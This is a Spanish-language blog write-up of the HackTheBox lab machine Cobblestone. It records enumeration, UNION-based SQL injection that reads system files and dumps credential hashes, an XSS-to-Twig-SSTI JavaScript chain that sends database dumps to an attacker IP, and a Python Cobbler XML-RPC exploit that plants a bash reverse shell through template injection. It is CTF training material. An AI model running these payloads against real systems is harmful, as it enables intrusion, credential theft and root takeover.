---
layout: post
title: HackTheBox-Cobblestone
description: Resolucion de la maquina Cobblestone de HackTheBox
date: 2026-07-15 20:24:59 -500
categories: [HTB, Insane]
tags: [XSS, SQLi, SSTI, API]
home_image: logo
logo:
  path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f7fc177-82e6-4b9b-acd3-0d8829304a1b.png
  alt: "Cobblestone"
---

Cobblestone es una máquina Linux de dificultad insane en Hack The Box que se centra en la explotación web avanzada, las vulnerabilidades endadenadas, las rutas de ataque autenticadas y el abuso de servicios internos. 

## Enumeración de Nmap
Comencé la fase de enumeración ejecutando un escaneo Nmap intensivo contra el objetivo para identificar puertos abiernos, servicios en ejecución y posibles vectores de ataque. El escaneo reveló solo dos servicios accesibles: SSH en el puerto 22 y un servidor web Apache en el puerto 80.

```bash
nmap -sCV -A 10.129.232.170
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 17:59 -0500
Nmap scan report for 10.129.232.170
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://cobblestone.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.32 seconds
```

El servidor HTTP redirigió inmediatamente las solicitudes a cobblestone.htb, lo que indica que la aplicación estaba utilizando virtual host configuration. Tambien observé que el objetivo ejecutaba servicios basados en Debian con OpenSSH 9.2p1 y Apache 2.4.62, lo que me permitió comprender inicialmente el sistema operativo y el entorno antes de pasar a la enumeración web. 

## Enumeración de subdominios 

Tras identificar la aplicación web principal, procedí a realizar pruebas de fuzzing sobre el virtual host para descubrir subdominios adicionales configurados en el objetivo. Dado que la aplicación utilizaba el hostname cobblestone.htb, sospeché que podrían existir endpoints de desarrollo o administración ocultos, ejecutándose en virtual hosts separados.

```bash
ffuf -u http://FUZZ.cobblestone.htb -w /usr/share/wordlists/Discovery/DNS/subdomains-top1millon-110000.txt -fc 404 -t 50
```

```
ffuf -u http://FUZZ.cobblestone.htb -H "Host: FUZZ.cobblestone.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 404 -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.cobblestone.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cobblestone.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

mc                      [Status: 302, Size: 291, Words: 18, Lines: 10, Duration: 285ms]
vote                    [Status: 302, Size: 81, Words: 10, Lines: 4, Duration: 288ms]
deploy                  [Status: 200, Size: 1745, Words: 121, Lines: 52, Duration: 279ms]
```

Los resultados del fuzzing revelaron tres subdominios válidos: mc, vote, y deploy. El host deploy devolvió una respuesta 200 OK, lo que lo convierte en el objetivo más interesante para una investigación más profunda, mientras que los demás redirigieron con respuestas 302. En esta etapa, agregué los subdominios descubiertos a mi archivo /etc/hosts y continué enumerando la superficie de ataque recién descubierta.

## Enumeración de directorios

Tras identificar el virtual host principal, procedí a enumerar los directorios para mapear la aplicación web y descubrir funcionalidades ocultas. Me centré en los endpoints PHP más comunes y en posibles archivos de desarrollo que podrían exponer funciones sensibles o configuraciones incorrectas.

```bash
gobuster dir -u http://cobblestone.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,git -t 50 --timeout 10s
```

```
gobuster dir -u http://cobblestone.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,git -t 50 --timeout 10s
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cobblestone.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1942]
/download.php         (Status: 200) [Size: 0]
/img                  (Status: 301) [Size: 316] [--> http://cobblestone.htb/img/]
/login.php            (Status: 200) [Size: 4659]
/register.php         (Status: 200) [Size: 0]
/templates            (Status: 301) [Size: 322] [--> http://cobblestone.htb/templates/]
/user.php             (Status: 403) [Size: 14]
/upload.php           (Status: 403) [Size: 14]
/skins                (Status: 301) [Size: 318] [--> http://cobblestone.htb/skins/]
/skins.php            (Status: 302) [Size: 81] [--> login.php]
/css                  (Status: 301) [Size: 316] [--> http://cobblestone.htb/css/]
/db                   (Status: 301) [Size: 315] [--> http://cobblestone.htb/db/]
/vendor               (Status: 301) [Size: 319] [--> http://cobblestone.htb/vendor/]
```

El escaneo reveló varios endpoints interesantes, incluyendo `login.php`, `upload.php`, `download.php`, y `user.php`. Las páginas upload.php y user.php devolvieron 403 Forbidden, lo que sugiere que la funcionalidad existía pero requería autenticación o elusión del control de acceso. También noté un directorio /db y una carpeta /vendor, lo que insinuaba que la aplicación podría estar utilizando dependencias PHP de terceros que merecen una investigación más profunda.

## Configuración del host

Tras descubrir hosts virtuales adicionales durante la enumeración de subdominios, tuve que configurar mi máquina local para que los dominios descubiertos se resolvieran correctamente a la dirección IP de destino. Sin este paso, el servidor web no serviría correctamente las diferentes aplicaciones asociadas a cada nombre de host.

```bash
echo "10.129.232.170 cobblestone.htb vote.cobblestone.htb deploy.cobblestone.htb" | sudo tee -a /etc/hosts
```

Me autentiqué con privilegios sudo y agregué los dominios descubiertos al archivo /etc/hosts. Una vez que los nombres de host se resolvieron localmente, pude acceder a los virtual hosts `vote` y `deploy` directamente desde el navegador y continuar enumerando las aplicaciones web recién expuestas.
## Enumeración de aplicaciones web

A continuación, accedí a la dirección IP de destino (10.129.232.170) en el navegador y fui redirigido automáticamente a http://cobblestone.htb, lo que confirmó que la aplicación utilizaba enrutamiento de host virtual. La página de destino parecía ser una plataforma con temática de Minecraft, con múltiples servicios interconectados expuestos a través de diferentes subdominios.

![alt text](/assets/img/image-1.png)

Durante la enumeración manual, observé que la página web hacía referencia a los mismos subdominios que había descubierto previamente mediante pruebas de fuzzing en virtual hosts. La aplicación exponía un portal de despliegue en deploy.cobblestone.htb, una función de gestión de temas a través de skins.php, y un sistema de votación beta alojado en vote.cobblestone.htb. Estos servicios independientes ampliaron significativamente la superficie de ataque y me brindaron múltiples áreas para investigar posibles vulnerabilidades. 

## Implementar enumeración de subdominios

A continuación, pasé al subdominio deploy.cobblestone.htb para investigar el servicio de despliegue que se descubrió durante la prueba de fuzzing del virtual host. La página parecía ser un sitio provisional marcado como 'Still under development', lo que sugería que la función aún no se había implementado por completo.

![alt text](/assets/img/image-1.png)

Durante la enumeración manual de la página, identifiqué varios nombres de personal y breves descripciones relacionadas con la administración de Linux y el hardening de seguridad. Sin embargo, no había endpoints, formularios, ni funcionalidad interactiva accesibles que pudieran aprovecharse más en esta etapa. Dado que el subdominio no exponía ningún vector de ataque de forma inmediata, dirigí mi enfoque a los demás servicios expuestos por la aplicación.

## Enumeración del portal de autenticación y apariencia

A continuación, visité http://cobblestone.htb/skins.php, pero la aplicación me redirigió a http://cobblestone.htb/login.php, lo que indicaba que se requería autenticación antes de acceder a la base de datos de skins. La página de login contenía dos funcionalidades distintas: un formulario de login para usuarios existentes y un formulario de registro para crear nuevas cuentas.

![alt text](/assets/img/image-2.png)

Procedí a registrar una nueva cuenta proporcionando un username, first name, last name, email address, y password. Tras crear la cuenta exitosamente, me autentiqué en la aplicación y obtuve acceso al portal de 'Skins'.

![alt text](/assets/img/image-3.png)

![alt text](/assets/img/image-4.png)

Una vez dentro de la aplicación, enumeré las entradas de skins disponibles y descubrí varios usernames asociados con Minecraft skins descargables. Las cuentas listadas incluían Sword4000, ElDeathly, Dog1234, PaulGG, y NiftySmith. En esta etapa, estos usernames resultaban interesantes ya que potencialmente podrían reutilizarse en otros puntos del entorno para authentication o para continuar la enumeración.

## SQL Injection Enumeration

Tras autenticarme en la aplicación, navegué a la pestaña 'Suggest Skin' y encontré un formulario que contenía tres campos de entrada: username, skin name, y download URL. El parámetro download URL destacó de inmediato como una superficie de ataque interesante, ya que la aplicación parecía procesarlo directamente al enviarlo.

![alt text](/assets/img/image-5.png)

Archivo `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
cobble:x:1000:1000:cobble,,,:/home/cobble:/bin/rbash
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
tftp:x:104:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Enumerar las bases de datos:

```sql
url=-9999' UNION ALL SELECT 1,2,3,GROUP_CONCAT(schema_name SEPARATOR ','),5 FROM information_schema.schemata-- -
```

```
information_schema,vote 
```

```sql
url=-9999' UNION ALL SELECT 1,2,3,GROUP_CONCAT(id,':',Username,':',Email,':',Password SEPARATOR '\n'),5 FROM users-- -
```

|user|hash|
|---|---|
|admin|`$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86`|
|eldementor|`$2y$10$3w4du3H1D2CBhE4iRJNEO.BHZ3urCUGxJhAcYKJef4GUQNx.lQZNC`|
```sql
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),5-- -
```

```xml
<VirtualHost *:80>
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^cobblestone.htb$
    RewriteRule /.* http://cobblestone.htb/ [R]
    ServerName 127.0.0.1
    ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
    ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
    ServerName cobblestone.htb
    ServerAdmin cobble@cobblestone.htb
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        AAHatName cobblestone
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^cobblestone.htb$
    RewriteRule /.* http://cobblestone.htb/ [R]

    Alias /cobbler /srv/www/cobbler
    <Directory /srv/www/cobbler>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>

<VirtualHost *:80>
    ServerName deploy.cobblestone.htb
    ServerAdmin cobble@cobblestone.htb
    DocumentRoot /var/www/deploy

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
    RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
    ServerName vote.cobblestone.htb
    ServerAdmin cobble@cobblestone.htb
    DocumentRoot /var/www/vote

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
    RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>
```

```bash
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/etc/ssh/sshd_config'),5-- -
```

```bash
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication no

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin prohibit-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts clientspecified
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
PrintLastLog no
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server

DenyUsers john

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

Match User cobble
	X11Forwarding no
	ChrootDirectory /home/chroot_jail
```

```sql
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/var/www/html/db/connection.php'),5-- -
```

```php
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
```

```sql
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/var/www/vote/suggest_skin.php'),5-- -
```

```php
<?php


include('db/connection.php');
session_start();

if (!isset($_SESSION['role'])) {
http_response_code(403); // Optional: send 403 Forbidden
die('Access denied.');
}


$_SESSION['suggestion_message'] = '';
$_SESSION['suggestion_message_type'] = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $name = $_POST['name'];
    $url = $_POST['url'];

    $stmt = $conn->prepare("INSERT INTO suggestions (username, name, url) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $user, $name, $url);

    if ($stmt->execute()) {
        $_SESSION['suggestion_message'] = "Suggestion has been added succesfully and will be reviewed by an admin.";
        $_SESSION['suggestion_message_type'] = "success";
        header("Location: skins.php");
        exit();
    } else {
        $_SESSION['suggestion_message'] = "Something went wrong submitting your suggestion.";
        $_SESSION['suggestion_message_type'] = "error";
        header("Location: skins.php");
        exit();
    }

    $stmt->close();
}
$conn->close();

?>
```

```sql
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/var/www/html/preview_banner.php'),5-- -
```

```php
<?php
session_start();

if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    http_response_code(403); // Optional: send 403 Forbidden
    die('Access denied.');
}

include('vendor/autoload.php');

// Setup Twig
$loader = new \Twig\Loader\FilesystemLoader('templates');
$twig = new \Twig\Environment($loader);

// Get POST data
$first = $_POST['first'] ?? null;

// Render header
echo $twig->render('header.html.twig', ['first' => $twig->createTemplate($first)->render()]);
```

## XSS + SSTI

XSS: 

```html
<script src="http://10.10.14.93:8081/pwn.js"></script>
```

Payload: 

{% raw %}
```js
var x = new XMLHttpRequest();
x.open('POST', '/preview_banner.php', false); 
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
x.send('first={{7*7}}'); 
new Image().src = 'http://10.10.14.93:9999/SSTI?d=' + encodeURIComponent(x.responseText);
```
{% endraw %}

{% raw %}
```js
(async () => {
    const url_preview_banner = "http://cobblestone.htb/preview_banner.php";
    const url_attacker = "http://10.10.14.93:9999";
    cmd = "mysqldump -h127.0.0.1 -udbuser -paichooDeeYanaekungei9rogi0eMuo2o cobblestone users";

    let request = await fetch(url_preview_banner, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'first=' + encodeURIComponent("{{ ['" + cmd + "'] | map('system') | join }}")

    });

    let response = await request.text();
    const data_url_decode = btoa(unescape(encodeURIComponent(response)));
    
    for (let i = 0; i * 1600 < data_url_decode.length; i++) {
        await fetch(url_attacker + '/?i=' + i + '&r=' + data_url_decode.substr(i * 1600, 1600))
    }
})();
```
{% endraw %}

![alt text](/assets/img/image-7.png)

Cobble HASH:
```
20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d:iluvdannymorethanyouknow
```

## Escalada de privilegios

Tras tunelizar el servicio interno de Cobbler mediante SSH, comencé a enumerar la interfaz XMLRPC expuesta en 127.0.0.1:25151. Durante las pruebas, descubrí que Cobbler aceptaba un nombre de usuario vacío con -1 como contraseña vacía y devolvía un token de sesión válido sin necesidad de autenticación. Esto permitía acceder directamente a la funcionalidad 
administrativa a través de la API XMLRPC.

Ruta: 
1. Nos conectamos a la API XML-RPC de Cobbler.
2. Obtienemos una sesión válida mediante login.
3. Creamos una plantilla Kickstart personalizada.
4. Introducimos dentro de la plantilla una instrucción ejecutable del motor Cheetah.
5. Registramos una distribución Linux falsa.
6. Creamos un perfil que combina la distribución con la plantilla.
7. Ordenamos a Cobbler generar la instalación automática.

Una investigación más profunda sobre la función de autoinstalación de Cobbler reveló que las plantillas se renderizaban utilizando el motor de plantillas Cheetah. Dado que Cheetah admite la ejecución de Python incrustado a través de la directiva `#set` me di cuenta de que podía inyectar una carga útil maliciosa que ejecutara comandos del sistema como el usuario del servicio Cobbler, que se ejecuta como root.

```python
# Importa la librería de Python para comunicarse con servicios que usan XML-RPC
# En este caso permite llamar funciones del servidor Cobbler remotamente.
import xmlrpc.client

# IP del equipo atacante donde se recibirá la conexión inversa (reverse shell)
LHOST = "10.10.15.89"

# Puerto donde el atacante estará escuchando la conexión
LPORT = "4444"

# Crea una cadena de texto multilínea que será utilizada como plantilla Kickstart.
# Cobbler utiliza estas plantillas para automatizar instalaciones de sistemas Linux.
payload = f"""
#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"')
lang en_US
keyboard us
network --bootproto=dhcp
rootpw --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
"""

# Crea un objeto cliente XML-RPC.
# Este objeto permite comunicarse con la API de Cobbler.
# El servicio XML-RPC de Cobbler normalmente escucha en el puerto 25151.
s = xmlrpc.client.ServerProxy("http://127.0.0.1:25151")

# Realiza una autenticación contra la API de Cobbler.
# Devuelve un token que será necesario para ejecutar operaciones posteriores.
# El token funciona como una sesión temporal.
t = s.login("", -1) 


# Envía a Cobbler una nueva plantilla de instalación llamada "pwn.ks".
# El contenido de esa plantilla será el payload creado anteriormente.
# Cobbler guardará esta plantilla para usarla en instalaciones automáticas.
s.write_autoinstall_template("pwn.ks", payload, t)


# Crea un nuevo objeto de tipo distribución dentro de Cobbler.
# Una distribución representa un sistema operativo que puede ser instalado.
did = s.new_distro(t)

  
# Cambia el nombre de la distribución creada.
# Aquí se le asigna el nombre "pwindistro".
s.modify_distro(did, "name", "pwindistro", t)


# Define la arquitectura del sistema operativo.
# En este caso se indica arquitectura de 64 bits.
s.modify_distro(did, "arch", "x86_64", t)

  
# Define la familia del sistema operativo.
# "redhat" indica sistemas basados en RedHat/CentOS/Fedora.
s.modify_distro(did, "breed", "redhat", t)

# Define el kernel Linux que utilizará esta distribución.
# Este archivo contiene el núcleo del sistema operativo.
s.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", t)

# Define el archivo initrd.
# Initrd contiene los módulos y archivos necesarios para arrancar Linux.
s.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", t)

# Guarda todos los cambios realizados en la distribución dentro de Cobbler.
s.save_distro(did, t)

# Crea un nuevo perfil en Cobbler.
# Un perfil combina:
# - una distribución
# - una plantilla de instalación
# - configuraciones adicionales
pid = s.new_profile(t)

# Asigna un nombre al perfil creado.
s.modify_profile(pid, "name", "pwnprofile", t)

# Relaciona el perfil con la distribución creada anteriormente.
# Ahora el perfil utilizará "pwindistro".
s.modify_profile(pid, "distro", "pwindistro", t)

# Asigna la plantilla Kickstart maliciosa al perfil.
# Cuando este perfil sea utilizado durante una instalación,
# utilizará el archivo pwn.ks.
s.modify_profile(pid, "autoinstall", "pwn.ks", t)

# Guarda el perfil dentro de Cobbler.
s.save_profile(pid, t)

#Genera autoinstall final
s.generate_profile_autoinstall("pwnprofile")
```
